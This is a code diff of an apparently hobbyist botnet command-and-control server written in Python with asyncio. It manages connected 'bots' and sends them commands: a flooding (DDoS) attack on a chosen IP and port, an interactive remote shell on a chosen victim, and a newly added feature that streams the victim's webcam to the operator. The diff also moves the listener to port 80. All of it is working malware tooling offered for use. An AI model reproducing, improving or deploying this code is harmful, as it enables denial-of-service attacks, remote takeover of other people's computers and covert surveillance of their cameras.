@@ -1,20 +1,33 @@
 import asyncio
+from asyncio import events
+from typing import Any, Coroutine
 import aioconsole
 import os
 import sys
-import json
+import cv2
+import numpy as np
 from rich.console import Console
 
+class Client():
+    def __init__(self, id:str=None, ip:str=None, writer:asyncio.StreamWriter=None, reader:asyncio.StreamReader=None):
+        self.id = id
+        self.ip = ip
+        self.writer = writer
+        self.reader = reader
+
 HOST = "0.0.0.0"
-PORT = 8888
+PORT = 80
 
 is_flooding = False
+is_streaming_cam = False
+
+clients: list[Client] = []
 
 console = Console(highlight=False)
 server:asyncio.Server = None
 
-writer:asyncio.StreamWriter = None
-reader:asyncio.StreamReader = None
+server_commands_task:asyncio.Task = None
+shell_task:asyncio.Task = None
 
 prompt_prefix = "server:~$ "
 shell_prompt_prefix = "> "
@@ -27,15 +40,6 @@ title = r"""
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
                       [cyan]Created by User ;) ~ v1[/cyan]     
 """
-
-class Client():
-    def __init__(self, id:str=None, ip:str=None, writer:asyncio.StreamWriter=None, reader:asyncio.StreamReader=None):
-        self.id = id
-        self.ip = ip
-        self.writer = writer
-        self.reader = reader
-
-clients: list[Client] = []
 
 #? Remove everything displayed in the terminal
 def clear_screen():
@@ -53,22 +57,64 @@ def get_client_from_id(input_id:int):
     except:
         console.print("[red](-)Client wasn't found[/red]")
         
+#? Get the arguments in a command
 def get_arg(tokens:list, arg_token:str):
     return str(tokens[tokens.index(arg_token) + 1])
 
+#? Controls the async input
+async def async_input(prompt):
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(None, input, prompt)
+
 #? The main part of the program, from here the user will control everything (commands, bots, etc)
-async def main_gui():
+def main_gui():
     clear_screen()
     console.print(f"[bright_red]{title}[/bright_red]")
     console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
     console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")
+
+#? Handles the server commands
+async def server_commands():
+    while True:
+        command = await async_input(f"\n{prompt_prefix}")
+        await parse_command(command)
+        await asyncio.sleep(0.01)
+        
+#? Run a shell
+async def shell(tokens):
+    global server_commands_task
+    
+    client = get_client_from_id(get_arg(tokens, "-id"))
+    console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with 'q'[/cyan]")
     
     while True:
-        command = await aioconsole.ainput(f"\n{prompt_prefix}")
-        await parse_command(command)
-
+        command = await async_input(f"\n{shell_prompt_prefix}")
+            
+        if command == "q":
+            server_commands_task = asyncio.create_task(server_commands())
+            await server_commands_task
+            return
+        
+        client.writer.write(f"shell {command}".encode())
+        
+        header_data = await client.reader.readuntil(b"\n")
+        header_parts = header_data.split(b":")
+                
+        #? if the marker is NOT found in the header parts, go back to the beginning of the while loop
+        if b'shell-marker' not in header_parts:
+            return
+                
+        response_length = int(header_parts[header_parts.index(b"byte-length") + 1])
+        response_data = await client.reader.readexactly(response_length)
+        response_data = response_data.decode().splitlines()
+        response_data = "\n".join(response_data)
+        
+        console.print(f"[cyan]{response_data}[/cyan]")
+        
 #? Parse commands to client
 async def parse_command(command:str):
+    global shell_task
+    
     try:
         tokens = command.split()
         if not tokens:
@@ -78,7 +124,7 @@ async def parse_command(command:str):
         if command == "help":
             console.print("[INSERT HELP]")
         elif command == "clear":
-            clear_screen_to_menu()
+            main_gui()
         elif command == "ls":
             await list_clients()
         elif command == "info":
@@ -90,32 +136,16 @@ async def parse_command(command:str):
         elif command == "stop_flood":
             await stop_flood()
         elif command == "shell":
-            await shell(tokens)
+            server_commands_task.cancel()
+            shell_task = asyncio.create_task(shell(tokens))
+        elif command == "stream_cam":
+            asyncio.create_task(stream_cam(tokens))
         elif command == "quit":
             sys.exit()
         else:
             console.print("[red](-) Command not found[/red]")
     except:
         pass
-
-#? Run a shell
-async def shell(tokens):
-    client = get_client_from_id(get_arg(tokens, "-id"))
-    console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with ^Z[/cyan]")
-    
-    while True:
-        command = await aioconsole.ainput(f"\n{shell_prompt_prefix}")
-        
-        if command == "^Z":
-            break
-        
-        client.writer.write(f"shell {command}".encode())
-        response = await reader.read(1024)
-        response = response.decode()
-        response = response.split()
-        response = " ".join(response)
-        
-        console.print(f"[cyan]{response}[/cyan]")
         
 #? Remove everything, then print out the menu
 def clear_screen_to_menu():
@@ -160,9 +190,6 @@ async def flood(tokens:list):
             console.print("[cyan](*) A flooding attack is already happening, stop it with 'stop_flood'[/cyan]")
             return
         
-        if tokens.index("-ip") and tokens.index("-port"):
-            pass
-        
         tokens = " ".join(tokens)
         for c in clients:
             c.writer.write(str(tokens).encode())
@@ -189,13 +216,48 @@ async def stop_flood():
         is_flooding = False
     except Exception as e:
         console.print(f"[red](-) Error: {e}[/red]")
+        
+#? Stream webcam
+async def stream_cam(tokens:list):
+    try:
+        client = get_client_from_id(get_arg(tokens, "-id"))
+        
+        client.writer.write("stream_cam".encode())
+        cv2.namedWindow(f"Bot ID: {client.id}")
+        console.print("[cyan](*) Getting bot cam...[/cyan]")
+        while True:
+            header_data = await client.reader.readuntil(b"\n")
+            header_parts = header_data.split(b":")
+            header_parts = [part.strip() for part in header_parts]
+            
+            #? if the marker is NOT found in the header parts, go back to the beginning of the while loop
+            if b'stream-cam-marker' not in header_parts:
+                continue
+            
+            frame_length = int(header_parts[header_parts.index(b"byte-length") + 1])
+            frame_data = bytearray()
+            while len(frame_data) < frame_length:
+                chunk = await client.reader.read(frame_length - len(frame_data))
+                frame_data.extend(chunk)
+
+            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
+            cv2.imshow(f"Bot ID: {client.id}", frame)
+            
+            await asyncio.sleep(0)
+            
+            key = cv2.waitKey(1) & 0xFF
+            
+            if key == ord("q") or key == 27:
+                break
+            
+        cv2.destroyWindow(f"Bot ID: {client.id}")
+    except Exception as e:
+        print(e)
+    except (ValueError, IndexError):
+        console.print("[red](-) Formatting Error: 'stream_cam -id (ID)'[/red]")
 
 #? Gets called whenever a client connects
-async def handle_client(_reader:asyncio.StreamReader, _writer:asyncio.StreamWriter):
-    global reader, writer
-    reader = _reader
-    writer = _writer
-    
+async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):   
     try:
         id = len(clients) + 1
         ip = writer.get_extra_info("peername")
@@ -213,8 +275,12 @@ async def handle_client(_reader:asyncio.StreamReader, _writer:asyncio.StreamWrit
 #? Start server + keep it going forever
 async def start_server():
     global server
+    global server_commands_task
+    
     server = await asyncio.start_server(handle_client, HOST, PORT)
-    await asyncio.gather(main_gui(), server.serve_forever())
+    main_gui()
+    server_commands_task = asyncio.create_task(server_commands())
+    await asyncio.create_task(server.serve_forever())
     
 async def start_screen():
     try:
